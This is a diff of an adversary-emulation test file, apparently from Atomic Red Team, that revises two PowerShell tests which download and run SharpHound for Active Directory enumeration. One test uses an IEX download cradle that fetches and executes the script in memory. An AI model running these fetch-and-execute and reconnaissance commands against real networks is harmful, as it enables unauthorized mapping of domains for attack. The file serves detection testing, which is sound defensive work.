@@ -23482,25 +23482,17 @@ execution:
       description: |
         Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.
 
-        Successful execution will produce stdout reporting LDAP connection was successful and BloodHound domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip file.
+        Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.
       supported_platforms:
       - windows
       input_arguments:
-        internal_domain:
-          description: Specify internal domain name to analyze
-          type: string
-          default: windomain.local
         file_path:
           description: File path for SharpHound payload
           type: String
           default: PathToAtomicsFolder\T1086\src
-        output_path:
-          description: Output path for BloodHound reports
-          type: String
-          default: PathToAtomicsFolder\T1086\src
       dependency_executor_name: powershell
       dependencies:
-      - description: 'Validate if SharpHound.ps1 is located in #{file_path}.'
+      - description: 'SharpHound.ps1 must be located at #{file_path}'
         prereq_command: 'if (Test-Path #{file_path}\SharpHound.ps1) {exit 0} else
           {exit 1}'
         get_prereq_command: Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1"
@@ -23510,29 +23502,28 @@ execution:
         elevation_required: false
         command: |
           write-host "Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan
-          import-module #{file_path}\SharpHound.ps1; invoke-bloodhound -domain #{internal_domain} -OutputDirectory #{output_path}
+          import-module #{file_path}\SharpHound.ps1
+          Invoke-BloodHound -OutputDirectory $env:Temp
+          Start-Sleep 5
         cleanup_command: |
-          Remove-Item #{file_path}\SharpHound.ps1 -Force
-          Remove-Item #{file_path}\*BloodHound.zip -Force
+          Remove-Item #{file_path}\SharpHound.ps1 -Force -ErrorAction Ignore
+          Remove-Item $env:Temp\*BloodHound.zip -Force
     - name: Run Bloodhound from Memory using Download Cradle
       description: |
-        Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to #{output_path}. If system is unable to contact a domain, proper execution will not occur.
+        Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.
 
-        Successful execution will produce stdout reporting LDAP connection was successful and BloodHound domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip file.
+        Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.
       supported_platforms:
       - windows
-      input_arguments:
-        output_path:
-          description: Output path for BloodHound reports
-          type: String
-          default: PathToAtomicsFolder\T1086\src
       executor:
         name: powershell
         elevation_required: false
         command: |
-          write-host "Remote download of SharpHound.ps1, import and execution from $env:temp" -ForegroundColor Cyan
-          powershell -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');Invoke-BloodHound -OutputDirectory #{output_path}"
-        cleanup_command: 'Remove-Item #{output_path}\*BloodHound.zip -Force
+          write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
+          IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
+          Invoke-BloodHound -OutputDirectory $env:Temp
+          Start-Sleep 5
+        cleanup_command: 'Remove-Item $env:Temp\*BloodHound.zip -Force
 
 '
     - name: Obfuscation Tests
